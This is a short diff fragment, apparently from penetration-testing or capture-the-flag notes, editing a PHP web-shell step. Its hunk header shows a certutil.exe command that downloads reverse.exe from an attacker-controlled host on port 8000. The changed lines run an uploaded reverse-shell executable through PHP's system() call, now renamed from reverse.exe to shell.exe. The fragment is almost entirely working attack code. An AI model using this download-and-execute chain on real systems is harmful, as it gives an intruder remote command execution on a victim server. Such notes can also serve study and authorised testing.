@@ -12,5 +12,5 @@ $exec = system('certutil.exe -urlcache -split -f "http://{own-ip}:8000/reverse.e
 
 # Step2: Execute uploaded reverse shell
 <?php 
-$exec = system('reverse.exe', $val); 
+$exec = system('shell.exe', $val); 
 ?> 
